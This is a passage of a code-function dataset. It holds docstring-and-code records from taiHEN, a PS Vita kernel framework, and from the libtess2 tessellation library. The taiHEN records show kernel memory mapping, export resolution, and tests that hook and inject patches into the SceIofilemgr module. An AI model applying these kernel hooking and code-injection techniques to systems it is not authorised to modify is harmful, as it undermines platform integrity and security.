LOG(\"ksceKernelAllocMemBlock(taislab): 0x%08X\", *exe_res);\n    if (*exe_res < 0) {\n        return *exe_res;\n    }\n    res = ksceKernelGetMemBlockBase(*exe_res, (void **)exe_addr);\n    LOG(\"ksceKernelGetMemBlockBase(%x): 0x%08X, addr: 0x%08X\", *exe_res, res, *exe_addr);\n    if (res < 0) {\n        goto err2;\n    }\n\n    // TODO: Perhaps move this to execmem seal?\n    if (pid != KERNEL_PID) {\n        res = ksceKernelMapBlockUserVisible(*exe_res);\n        LOG(\"ksceKernelMapBlockUserVisible: %x\", res);\n        if (res < 0) {\n            goto err2;\n        }\n    }\n\n    // map in every process if needed\n    if (pid == SHARED_PID) {\n        // FIXME: implement this\n    }\n\n    // allocate mirror\n    memset(&opt, 0, sizeof(opt));\n    opt.size = sizeof(opt);\n    opt.attr = 0x1000040;\n    opt.mirror_blockid = *exe_res;\n    res = ksceKernelAllocMemBlock(\"taimirror\", SCE_KERNEL_MEMBLOCK_TYPE_RW_UNK0, 0, &opt);\n    LOG(\"ksceKernelAllocMemBlock(taimirror): 0x%08X\", res);\n    if (res < 0) {\n        goto err2;\n    }\n    blkid = res;\n    res = ksceKernelGetMemBlockBase(blkid, ptr);\n    LOG(\"ksceKernelGetMemBlockBase(%x): 0x%08X, addr: 0x%08X\", blkid, res, *ptr);\n    if (res < 0) {\n        goto err1;\n    }\n\n    return blkid;\n\nerr1:\n    ksceKernelFreeMemBlock(blkid);\nerr2:\n    ksceKernelFreeMemBlock(*exe_res);\n    return res;\n}", "path": "slab.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Gets an exported function address\n *\n * @param[in]  pid      The pid\n * @param[in]  modname  The name of module to lookup\n * @param[in]  libnid   NID of the exporting library. Can be `TAI_ANY_LIBRARY`.\n * @param[in]  funcnid  NID of the exported function\n * @param[out] func     Output address of the function\n *\n * @return     Zero on success, < 0 on error\n */\n", "func_signal": "int module_get_export_func(SceUID pid, const char *modname, uint32_t libnid, uint32_t funcnid, uintptr_t *func)", "code": "{\n  sce_module_exports_t local;\n  tai_module_info_t info;\n  sce_module_exports_t *export;\n  uintptr_t cur;\n  int found;\n  int i;\n  int ret;\n\n  LOG(\"Getting export for pid:%x, modname:%s, libnid:%x, funcnid:%x\", pid, modname, libnid, funcnid);\n  info.size = sizeof(info);\n  if (module_get_by_name_nid(pid, modname, TAI_IGNORE_MODULE_NID, &info) < 0) {\n    LOG(\"Failed to find module: %s\", modname);\n    return TAI_ERROR_NOT_FOUND;\n  }\n\n  for (cur = info.exports_start; cur < info.exports_end; ) {\n    if (pid == KERNEL_PID) {\n      export = (sce_module_exports_t *)cur;\n    } else {\n      if ((ret = ksceKernelMemcpyUserToKernelForPid(pid, &local, cur, sizeof(local))) < 0) {\n        LOG(\"Error trying to read address %p for %x: %x\", cur, pid, ret);\n        return ret;\n      }\n      export = &local;\n    }\n\n    if (libnid == TAI_ANY_LIBRARY || export->lib_nid == libnid) {\n      if (pid == KERNEL_PID) {\n        for (i = 0; i < export->num_functions; i++) {\n          if (export->nid_table[i] == funcnid) {\n            *func = (uintptr_t)export->entry_table[i];\n            LOG(\"found kernel address: 0x%08X\", *func);\n            return TAI_SUCCESS;\n          }\n        }\n      } else {\n        found = find_int_for_user(pid, (uintptr_t)export->nid_table, funcnid, export->num_functions * 4);\n        if (found >= 0) {\n          if ((ret = ksceKernelMemcpyUserToKernelForPid(pid, func, (uintptr_t)export->entry_table + found, 4)) < 0) {\n            LOG(\"Error trying to read address %p for %x: %x\", (uintptr_t)export->entry_table + found, pid, ret);\n            return ret;\n          }\n          LOG(\"found user address: 0x%08X\", *func);\n          return TAI_SUCCESS;\n        }\n      }\n    }\n    cur += export->size;\n  }\n\n  return TAI_ERROR_NOT_FOUND;\n}", "path": "module.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Pthreads start for a test\n *\n * @param      arg   The argument\n *\n * @return     NULL\n */\n", "func_signal": "int start_test(SceSize args, void *argp)", "code": "{\n  struct thread_args *targs = (struct thread_args *)argp;\n  int ret;\n  char name[256];\n  int i;\n  int flavor;\n  int skip;\n  tai_module_info_t info;\n\n  snprintf(name, 256, \"%s-thread-%d\", targs->prefix, targs->index);\n\n  i = targs->index;\n  flavor = targs->flavor;\n  ret = 0;\n  skip = 0;\n\n  TEST_MSG(\"starting test phase\");\n  if (flavor % 2) {\n    if (i >= TEST_1_NUM_HOOKS) {\n      TEST_MSG(\"no space, exiting\");\n      skip = 1;\n      goto wait;\n    }\n    ret = g_refs[i] = taiHookFunctionExportForKernel(KERNEL_PID, &g_hooks[i], \"SceIofilemgr\", TAI_ANY_LIBRARY, 0x75192972, hooks[i]);\n    if (ret == TAI_ERROR_PATCH_EXISTS) {\n      TEST_MSG(\"patch exists\");\n      ret = g_refs[i] = 0;\n      g_hooks[i] = 0;\n    } else if (ret < 0) {\n      goto wait;\n    }\n  } else {\n    if (i >= TEST_2_NUM_INJECT) {\n      TEST_MSG(\"no space, exiting\");\n      skip = 1;\n      goto wait;\n    }\n    info.size = sizeof(info);\n    ret = taiGetModuleInfoForKernel(KERNEL_PID, \"SceIofilemgr\", &info);\n    if (ret >= 0) {\n      ret = g_inj_refs[i] = taiInjectDataForKernel(KERNEL_PID, info.modid, 0, IOFILEMGR_OFFSET_SCEIOOPENFORDRIVER, &bxlr, 2);\n      if (ret == TAI_ERROR_PATCH_EXISTS) {\n        TEST_MSG(\"patch exists\");\n        ret = g_inj_refs[i] = 0;\n      } else if (ret < 0) {\n        goto wait;\n      }\n    }\n  }\n  if (ret < 0) {\n    TEST_MSG(\"TEST FAILED: %x\", ret);\n  }\nwait:\n  ksceKernelLockMutex(g_done_lock, 1, NULL);\n  g_done_count++;\n  ksceKernelUnlockMutex(g_done_lock, 1);\n  TEST_MSG(\"test start phase complete, waiting for others\");\n  ksceKernelLockMutex(g_wait_lock, 1, NULL);\n  ksceKernelUnlockMutex(g_wait_lock, 1);\n  TEST_MSG(\"starting cleanup phase\");\n  if (ret >= 0 && !skip) {\n    if (flavor % 2) {\n      if (g_refs[i]) {\n        ret = taiHookReleaseForKernel(g_refs[i], g_hooks[i]);\n      }\n    } else {\n      if (g_inj_refs[i]) {\n        ret = taiInjectReleaseForKernel(g_inj_refs[i]);\n      }\n    }\n    if (ret < 0) {\n      TEST_MSG(\"TEST CLEANUP FAILED: %x\", ret);\n    }\n  }\n  return ret;\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Test freeing hooked functions\n *\n *             This will free a hook for an export, an import, and an offset.\n *\n * @param[in]  name    The name of the test\n * @param[in]  flavor  The flavor of the test\n *\n * @return     Success\n */\n", "func_signal": "int test_scenario_1_cleanup(const char *name, int flavor)", "code": "{\n  int ret;\n  int i, j;\n  int ordering[TEST_1_NUM_HOOKS];\n  permute_index(flavor / 2, TEST_1_NUM_HOOKS+1, ordering);\n  for (j = 0; j < TEST_1_NUM_HOOKS; j++) {\n    i = ordering[j];\n    if (g_refs[i] > 0) {\n      TEST_MSG(\"releasing hook %d\", i);\n      ret = taiHookReleaseForKernel(g_refs[i], g_hooks[i]);\n      TEST_MSG(\"release %d: %x\", i, ret);\n    } else {\n      TEST_MSG(\"skipping %d\", i);\n    }\n    g_passed[i] = 0;\n    g_refs[i] = 0;\n    g_hooks[i] = 0;\n  }\n  ret = ksceIoOpen(\"ux0:bad\", 0, 0);\n  for (i = 0; i < TEST_1_NUM_HOOKS; i++) {\n    if (g_passed[i] == 0) {\n      TEST_MSG(\"RELEASE PASSED: %d, called: 0\", i);\n    } else {\n      TEST_MSG(\"RELEASE FAILED: %d, called: %d\", i, g_passed[i]);\n      return -1;\n    }\n  }\n  return 0;\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Creates a random permutation of integers 0..limit-2\n *\n *             `limit` MUST BE PRIME! `ordering` is an array of size limit-1.\n *\n * @param[in]  limit     The limit (MUST BE PRIME). Technically another \n *                       constraint is limit > 0 but 0 is not prime ;)\n * @param[out] ordering  An array of permutated indexes uniformly distributed\n */\n", "func_signal": "static inline void permute_index(int limit, int ordering[limit-1])", "code": "{\n  ordering[0] = rand() % (limit-1);\n  for (int i = 1; i < limit-1; i++) {\n    ordering[i] = (ordering[i-1] + ordering[0] + 1) % limit;\n  }\n}", "path": "tests\\test_proc_map.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Creates a random permutation of integers 0..limit-2\n *\n *             `limit` MUST BE PRIME! `ordering` is an array of size limit-1.\n *\n * @param[in]  rn        Random number\n * @param[in]  limit     The limit (MUST BE PRIME). Technically another\n *                       constraint is limit > 0 but 0 is not prime ;)\n * @param[out] ordering  An array of permutated indexes uniformly distributed\n */\n", "func_signal": "static inline void permute_index(int rn, int limit, int ordering[limit-1])", "code": "{\n  ordering[0] = (unsigned)rn % (limit-1);\n  for (int i = 1; i < limit-1; i++) {\n    ordering[i] = (ordering[i-1] + ordering[0] + 1) % limit;\n  }\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Test injection\n *\n * @param[in]  name  The name\n *\n * @return     Zero on success, < 0 on error\n */\n", "func_signal": "int test_scenario_2_test_inject(const char *name)", "code": "{\n  int ret;\n  ret = ksceIoOpen(name, 0, 0);\n  TEST_MSG(\"open after inject: %x\", ret);\n  if (ret != (int)name) return -1;\n  TEST_MSG(\"INJECT PASS\");\n  return 0;\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Gets an offset from a segment in a module\n *\n * @param[in]  pid     The pid of caller\n * @param[in]  modid   The module to offset from\n * @param[in]  segidx  Segment in module to offset from\n * @param[in]  offset  Offset from segment\n * @param[out] addr    Output final address\n *\n * @return     Zero on success, < 0 on error\n */\n", "func_signal": "int module_get_offset(SceUID pid, SceUID modid, int segidx, size_t offset, uintptr_t *addr)", "code": "{\n  SceKernelModuleInfo sceinfo;\n  size_t count;\n  int ret;\n\n  if (segidx > 3) {\n    LOG(\"Invalid segment index: %d\", segidx);\n    return TAI_ERROR_INVALID_ARGS;\n  }\n  LOG(\"Getting offset for pid:%x, modid:%x, segidx:%d, offset:%x\", pid, modid, segidx, offset);\n  sceinfo.size = sizeof(sceinfo);\n  ret = ksceKernelGetModuleInfo(pid, modid, &sceinfo);\n  LOG(\"ksceKernelGetModuleInfo(%x, %x): 0x%08X\", pid, modid, ret);\n  if (ret < 0) {\n    LOG(\"Error getting segment info for %d\", modid);\n    return ret;\n  }\n  if (offset > sceinfo.segments[segidx].memsz) {\n    LOG(\"Offset %x overflows segment size %x\", offset, sceinfo.segments[segidx].memsz);\n    return TAI_ERROR_INVALID_ARGS;\n  }\n  *addr = (uintptr_t)sceinfo.segments[segidx].vaddr + offset;\n  LOG(\"found address: 0x%08X\", *addr);\n\n  return TAI_SUCCESS;\n}", "path": "module.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/* MakeFace( newFace, eOrig, fNext ) attaches a new face and makes it the left\n* face of all edges in the face loop to which eOrig belongs.  \"fNext\" gives\n* a place to insert the new face in the global face list.  We insert\n* the new face *before* fNext so that algorithms which walk the face\n* list will not see the newly created faces.\n*/\n", "func_signal": "static void MakeFace( TESSface *newFace, TESShalfEdge *eOrig, TESSface *fNext )", "code": "{\n\tTESShalfEdge *e;\n\tTESSface *fPrev;\n\tTESSface *fNew = newFace;\n\n\tassert(fNew != NULL); \n\n\t/* insert in circular doubly-linked list before fNext */\n\tfPrev = fNext->prev;\n\tfNew->prev = fPrev;\n\tfPrev->next = fNew;\n\tfNew->next = fNext;\n\tfNext->prev = fNew;\n\n\tfNew->anEdge = eOrig;\n\tfNew->trail = NULL;\n\tfNew->marked = FALSE;\n\n\t/* The new face is marked \"inside\" if the old one was.  This is a\n\t* convenience for the common case where a face has been split in two.\n\t*/\n\tfNew->inside = fNext->inside;\n\n\t/* fix other edges on this face loop */\n\te = eOrig;\n\tdo {\n\t\te->Lface = fNew;\n\t\te = e->Lnext;\n\t} while( e != eOrig );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really tessPqSortNewPriorityQ */\n", "func_signal": "PriorityQ *pqNewPriorityQ( TESSalloc* alloc, int size, int (*leq)(PQkey key1, PQkey key2) )", "code": "{\n\tPriorityQ *pq = (PriorityQ *)alloc->memalloc( alloc->userData, sizeof( PriorityQ ));\n\tif (pq == NULL) return NULL;\n\n\tpq->heap = pqHeapNewPriorityQ( alloc, size, leq );\n\tif (pq->heap == NULL) {\n\t\talloc->memfree( alloc->userData, pq );\n\t\treturn NULL;\n\t}\n\n//\tpq->keys = (PQkey *)memAlloc( INIT_SIZE * sizeof(pq->keys[0]) );\n\tpq->keys = (PQkey *)alloc->memalloc( alloc->userData, size * sizeof(pq->keys[0]) );\n\tif (pq->keys == NULL) {\n\t\tpqHeapDeletePriorityQ( alloc, pq->heap );\n\t\talloc->memfree( alloc->userData, pq );\n\t\treturn NULL;\n\t}\n\n\tpq->size = 0;\n\tpq->max = size; //INIT_SIZE;\n\tpq->initialized = FALSE;\n\tpq->leq = leq;\n\t\n\treturn pq;\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* KillVertex( vDel ) destroys a vertex and removes it from the global\n* vertex list.  It updates the vertex loop to point to a given new vertex.\n*/\n", "func_signal": "static void KillVertex( TESSmesh *mesh, TESSvertex *vDel, TESSvertex *newOrg )", "code": "{\n\tTESShalfEdge *e, *eStart = vDel->anEdge;\n\tTESSvertex *vPrev, *vNext;\n\n\t/* change the origin of all affected edges */\n\te = eStart;\n\tdo {\n\t\te->Org = newOrg;\n\t\te = e->Onext;\n\t} while( e != eStart );\n\n\t/* delete from circular doubly-linked list */\n\tvPrev = vDel->prev;\n\tvNext = vDel->next;\n\tvNext->prev = vPrev;\n\tvPrev->next = vNext;\n\n\tbucketFree( mesh->vertexBucket, vDel );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* tessMeshCheckMesh( mesh ) checks a mesh for self-consistency.\n*/\n", "func_signal": "void tessMeshCheckMesh( TESSmesh *mesh )", "code": "{\n\tTESSface *fHead = &mesh->fHead;\n\tTESSvertex *vHead = &mesh->vHead;\n\tTESShalfEdge *eHead = &mesh->eHead;\n\tTESSface *f, *fPrev;\n\tTESSvertex *v, *vPrev;\n\tTESShalfEdge *e, *ePrev;\n\n\tfor( fPrev = fHead ; (f = fPrev->next) != fHead; fPrev = f) {\n\t\tassert( f->prev == fPrev );\n\t\te = f->anEdge;\n\t\tdo {\n\t\t\tassert( e->Sym != e );\n\t\t\tassert( e->Sym->Sym == e );\n\t\t\tassert( e->Lnext->Onext->Sym == e );\n\t\t\tassert( e->Onext->Sym->Lnext == e );\n\t\t\tassert( e->Lface == f );\n\t\t\te = e->Lnext;\n\t\t} while( e != f->anEdge );\n\t}\n\tassert( f->prev == fPrev && f->anEdge == NULL );\n\n\tfor( vPrev = vHead ; (v = vPrev->next) != vHead; vPrev = v) {\n\t\tassert( v->prev == vPrev );\n\t\te = v->anEdge;\n\t\tdo {\n\t\t\tassert( e->Sym != e );\n\t\t\tassert( e->Sym->Sym == e );\n\t\t\tassert( e->Lnext->Onext->Sym == e );\n\t\t\tassert( e->Onext->Sym->Lnext == e );\n\t\t\tassert( e->Org == v );\n\t\t\te = e->Onext;\n\t\t} while( e != v->anEdge );\n\t}\n\tassert( v->prev == vPrev && v->anEdge == NULL );\n\n\tfor( ePrev = eHead ; (e = ePrev->next) != eHead; ePrev = e) {\n\t\tassert( e->Sym->next == ePrev->Sym );\n\t\tassert( e->Sym != e );\n\t\tassert( e->Sym->Sym == e );\n\t\tassert( e->Org != NULL );\n\t\tassert( e->Dst != NULL );\n\t\tassert( e->Lnext->Onext->Sym == e );\n\t\tassert( e->Onext->Sym->Lnext == e );\n\t}\n\tassert( e->Sym->next == ePrev->Sym\n\t\t&& e->Sym == &mesh->eHeadSym\n\t\t&& e->Sym->Sym == e\n\t\t&& e->Org == NULL && e->Dst == NULL\n\t\t&& e->Lface == NULL && e->Rface == NULL );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really pqHeapDeletePriorityQHeap */\n", "func_signal": "void pqHeapDeletePriorityQ( TESSalloc* alloc, PriorityQHeap *pq )", "code": "{\n\talloc->memfree( alloc->userData, pq->handles );\n\talloc->memfree( alloc->userData, pq->nodes );\n\talloc->memfree( alloc->userData, pq );\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* tessMeshDeleteMesh( mesh ) will free all storage for any valid mesh.\n*/\n", "func_signal": "void tessMeshDeleteMesh( TESSalloc* alloc, TESSmesh *mesh )", "code": "{\n\tTESSface *fHead = &mesh->fHead;\n\n\twhile( fHead->next != fHead ) {\n\t\ttessMeshZapFace( fHead->next );\n\t}\n\tassert( mesh->vHead.next == &mesh->vHead );\n\n\talloc->memfree( alloc->userData, mesh );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* tessMeshSplitEdge( eOrg ) splits eOrg into two edges eOrg and eNew,\n* such that eNew == eOrg->Lnext.  The new vertex is eOrg->Dst == eNew->Org.\n* eOrg and eNew will have the same left face.\n*/\n", "func_signal": "TESShalfEdge *tessMeshSplitEdge( TESSmesh *mesh, TESShalfEdge *eOrg )", "code": "{\n\tTESShalfEdge *eNew;\n\tTESShalfEdge *tempHalfEdge= tessMeshAddEdgeVertex( mesh, eOrg );\n\tif (tempHalfEdge == NULL) return NULL;\n\n\teNew = tempHalfEdge->Sym;\n\n\t/* Disconnect eOrg from eOrg->Dst and connect it to eNew->Org */\n\tSplice( eOrg->Sym, eOrg->Sym->Oprev );\n\tSplice( eOrg->Sym, eNew );\n\n\t/* Set the vertex and face information */\n\teOrg->Dst = eNew->Org;\n\teNew->Dst->anEdge = eNew->Sym;\t/* may have pointed to eOrg->Sym */\n\teNew->Rface = eOrg->Rface;\n\teNew->winding = eOrg->winding;\t/* copy old winding information */\n\teNew->Sym->winding = eOrg->Sym->winding;\n\n\treturn eNew;\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* tessMeshDeleteMesh( mesh ) will free all storage for any valid mesh.\n*/\n", "func_signal": "void tessMeshDeleteMesh( TESSalloc* alloc, TESSmesh *mesh )", "code": "{\n\tdeleteBucketAlloc(mesh->edgeBucket);\n\tdeleteBucketAlloc(mesh->vertexBucket);\n\tdeleteBucketAlloc(mesh->faceBucket);\n\n\talloc->memfree( alloc->userData, mesh );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* tessMeshUnion( mesh1, mesh2 ) forms the union of all structures in\n* both meshes, and returns the new mesh (the old meshes are destroyed).\n*/\n", "func_signal": "TESSmesh *tessMeshUnion( TESSalloc* alloc, TESSmesh *mesh1, TESSmesh *mesh2 )", "code": "{\n\tTESSface *f1 = &mesh1->fHead;\n\tTESSvertex *v1 = &mesh1->vHead;\n\tTESShalfEdge *e1 = &mesh1->eHead;\n\tTESSface *f2 = &mesh2->fHead;\n\tTESSvertex *v2 = &mesh2->vHead;\n\tTESShalfEdge *e2 = &mesh2->eHead;\n\n\t/* Add the faces, vertices, and edges of mesh2 to those of mesh1 */\n\tif( f2->next != f2 ) {\n\t\tf1->prev->next = f2->next;\n\t\tf2->next->prev = f1->prev;\n\t\tf2->prev->next = f1;\n\t\tf1->prev = f2->prev;\n\t}\n\n\tif( v2->next != v2 ) {\n\t\tv1->prev->next = v2->next;\n\t\tv2->next->prev = v1->prev;\n\t\tv2->prev->next = v1;\n\t\tv1->prev = v2->prev;\n\t}\n\n\tif( e2->next != e2 ) {\n\t\te1->Sym->next->Sym->next = e2->next;\n\t\te2->next->Sym->next = e1->Sym->next;\n\t\te2->Sym->next->Sym->next = e1;\n\t\te1->Sym->next = e2->Sym->next;\n\t}\n\n\talloc->memfree( alloc->userData, mesh2 );\n\treturn mesh1;\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* KillFace( fDel ) destroys a face and removes it from the global face\n* list.  It updates the face loop to point to a given new face.\n*/\n", "func_signal": "static void KillFace( TESSmesh *mesh, TESSface *fDel, TESSface *newLface )", "code": "{\n\tTESShalfEdge *e, *eStart = fDel->anEdge;\n\tTESSface *fPrev, *fNext;\n\n\t/* change the left face of all affected edges */\n\te = eStart;\n\tdo {\n\t\te->Lface = newLface;\n\t\te = e->Lnext;\n\t} while( e != eStart );\n\n\t/* delete from circular doubly-linked list */\n\tfPrev = fDel->prev;\n\tfNext = fDel->next;\n\tfNext->prev = fPrev;\n\tfPrev->next = fNext;\n\n\tbucketFree( mesh->faceBucket, fDel );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* MakeVertex( newVertex, eOrig, vNext ) attaches a new vertex and makes it the\n* origin of all edges in the vertex loop to which eOrig belongs. \"vNext\" gives\n* a place to insert the new vertex in the global vertex list.  We insert\n* the new vertex *before* vNext so that algorithms which walk the vertex\n* list will not see the newly created vertices.\n*/\n", "func_signal": "static void MakeVertex( TESSvertex *newVertex, \n\t\t\t\t\t   TESShalfEdge *eOrig, TESSvertex *vNext )", "code": "{\n\tTESShalfEdge *e;\n\tTESSvertex *vPrev;\n\tTESSvertex *vNew = newVertex;\n\n\tassert(vNew != NULL);\n\n\t/* insert in circular doubly-linked list before vNext */\n\tvPrev = vNext->prev;\n\tvNew->prev = vPrev;\n\tvPrev->next = vNew;\n\tvNew->next = vNext;\n\tvNext->prev = vNew;\n\n\tvNew->anEdge = eOrig;\n\t/* leave coords, s, t undefined */\n\n\t/* fix other edges on this vertex loop */\n\te = eOrig;\n\tdo {\n\t\te->Org = vNew;\n\t\te = e->Onext;\n\t} while( e != eOrig );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really pqHeapInit */\n", "func_signal": "void pqHeapInit( PriorityQHeap *pq )", "code": "{\n\tint i;\n\n\t/* This method of building a heap is O(n), rather than O(n lg n). */\n\n\tfor( i = pq->size; i >= 1; --i ) {\n\t\tFloatDown( pq, i );\n\t}\n\tpq->initialized = TRUE;\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really pqHeapDelete */\n", "func_signal": "void pqHeapDelete( PriorityQHeap *pq, PQhandle hCurr )", "code": "{\n\tPQnode *n = pq->nodes;\n\tPQhandleElem *h = pq->handles;\n\tint curr;\n\n\tassert( hCurr >= 1 && hCurr <= pq->max && h[hCurr].key != NULL );\n\n\tcurr = h[hCurr].node;\n\tn[curr].handle = n[pq->size].handle;\n\th[n[curr].handle].node = curr;\n\n\tif( curr <= -- pq->size ) {\n\t\tif( curr <= 1 || LEQ( h[n[curr>>1].handle].key, h[n[curr].handle].key )) {\n\t\t\tFloatDown( pq, curr );\n\t\t} else {\n\t\t\tFloatUp( pq, curr );\n\t\t}\n\t}\n\th[hCurr].key = NULL;\n\th[hCurr].node = pq->freeList;\n\tpq->freeList = hCurr;\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really tessPqSortDeletePriorityQ */\n", "func_signal": "void pqDeletePriorityQ( TESSalloc* alloc, PriorityQ *pq )", "code": "{\n\tassert(pq != NULL); \n\tif (pq->heap != NULL) pqHeapDeletePriorityQ( alloc, pq->heap );\n\tif (pq->order != NULL) alloc->memfree( alloc->userData, pq->order );\n\tif (pq->keys != NULL) alloc->memfree( alloc->userData, pq->keys );\n\talloc->memfree( alloc->userData, pq );\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* tessMeshDelete( eDel ) removes the edge eDel.  There are several cases:\n* if (eDel->Lface != eDel->Rface), we join two loops into one; the loop\n* eDel->Lface is deleted.  Otherwise, we are splitting one loop into two;\n* the newly created loop will contain eDel->Dst.  If the deletion of eDel\n* would create isolated vertices, those are deleted as well.\n*\n* This function could be implemented as two calls to tessMeshSplice\n* plus a few calls to memFree, but this would allocate and delete\n* unnecessary vertices and faces.\n*/\n", "func_signal": "int tessMeshDelete( TESSmesh *mesh, TESShalfEdge *eDel )", "code": "{\n\tTESShalfEdge *eDelSym = eDel->Sym;\n\tint joiningLoops = FALSE;\n\n\t/* First step: disconnect the origin vertex eDel->Org.  We make all\n\t* changes to get a consistent mesh in this \"intermediate\" state.\n\t*/\n\tif( eDel->Lface != eDel->Rface ) {\n\t\t/* We are joining two loops into one -- remove the left face */\n\t\tjoiningLoops = TRUE;\n\t\tKillFace( mesh, eDel->Lface, eDel->Rface );\n\t}\n\n\tif( eDel->Onext == eDel ) {\n\t\tKillVertex( mesh, eDel->Org, NULL );\n\t} else {\n\t\t/* Make sure that eDel->Org and eDel->Rface point to valid half-edges */\n\t\teDel->Rface->anEdge = eDel->Oprev;\n\t\teDel->Org->anEdge = eDel->Onext;\n\n\t\tSplice( eDel, eDel->Oprev );\n\t\tif( ! joiningLoops ) {\n\t\t\tTESSface *newFace= (TESSface*)bucketAlloc( mesh->faceBucket );\n\t\t\tif (newFace == NULL) return 0; \n\n\t\t\t/* We are splitting one loop into two -- create a new loop for eDel. */\n\t\t\tMakeFace( newFace, eDel, eDel->Lface );\n\t\t}\n\t}\n\n\t/* Claim: the mesh is now in a consistent state, except that eDel->Org\n\t* may have been deleted.  Now we disconnect eDel->Dst.\n\t*/\n\tif( eDelSym->Onext == eDelSym ) {\n\t\tKillVertex( mesh, eDelSym->Org, NULL );\n\t\tKillFace( mesh, eDelSym->Lface, NULL );\n\t} else {\n\t\t/* Make sure that eDel->Dst and eDel->Lface point to valid half-edges */\n\t\teDel->Lface->anEdge = eDelSym->Oprev;\n\t\teDelSym->Org->anEdge = eDelSym->Onext;\n\t\tSplice( eDelSym, eDelSym->Oprev );\n\t}\n\n\t/* Any isolated vertices or faces have already been freed. */\n\tKillEdge( mesh, eDel );\n\n\treturn 1;\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* KillEdge( eDel ) destroys an edge (the half-edges eDel and eDel->Sym),\n* and removes from the global edge list.\n*/\n", "func_signal": "static void KillEdge( TESSmesh *mesh, TESShalfEdge *eDel )", "code": "{\n\tTESShalfEdge *ePrev, *eNext;\n\n\t/* Half-edges are allocated in pairs, see EdgePair above */\n\tif( eDel->Sym < eDel ) { eDel = eDel->Sym; }\n\n\t/* delete from circular doubly-linked list */\n\teNext = eDel->next;\n\tePrev = eDel->Sym->next;\n\teNext->Sym->next = ePrev;\n\tePrev->Sym->next = eNext;\n\n\tbucketFree( mesh->edgeBucket, eDel );\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really pqHeapInsert */\n/* returns INV_HANDLE iff out of memory */\n", "func_signal": "PQhandle pqHeapInsert( TESSalloc* alloc, PriorityQHeap *pq, PQkey keyNew )", "code": "{\n\tint curr;\n\tPQhandle free;\n\n\tcurr = ++ pq->size;\n\tif( (curr*2) > pq->max ) {\n\t\tif (!alloc->memrealloc)\n\t\t{\n\t\t\treturn INV_HANDLE;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tPQnode *saveNodes= pq->nodes;\n\t\t\tPQhandleElem *saveHandles= pq->handles;\n\n\t\t\t// If the heap overflows, double its size.\n\t\t\tpq->max <<= 1;\n\t\t\tpq->nodes = (PQnode *)alloc->memrealloc( alloc->userData, pq->nodes, \n\t\t\t\t(size_t)((pq->max + 1) * sizeof( pq->nodes[0] )));\n\t\t\tif (pq->nodes == NULL) {\n\t\t\t\tpq->nodes = saveNodes;\t// restore ptr to free upon return \n\t\t\t\treturn INV_HANDLE;\n\t\t\t}\n\t\t\tpq->handles = (PQhandleElem *)alloc->memrealloc( alloc->userData, pq->handles,\n\t\t\t\t(size_t) ((pq->max + 1) * sizeof( pq->handles[0] )));\n\t\t\tif (pq->handles == NULL) {\n\t\t\t\tpq->handles = saveHandles; // restore ptr to free upon return \n\t\t\t\treturn INV_HANDLE;\n\t\t\t}\n\t\t}\n\t}\n\n\tif( pq->freeList == 0 ) {\n\t\tfree = curr;\n\t} else {\n\t\tfree = pq->freeList;\n\t\tpq->freeList = pq->handles[free].node;\n\t}\n\n\tpq->nodes[curr].handle = free;\n\tpq->handles[free].node = curr;\n\tpq->handles[free].key = keyNew;\n\n\tif( pq->initialized ) {\n\t\tFloatUp( pq, curr 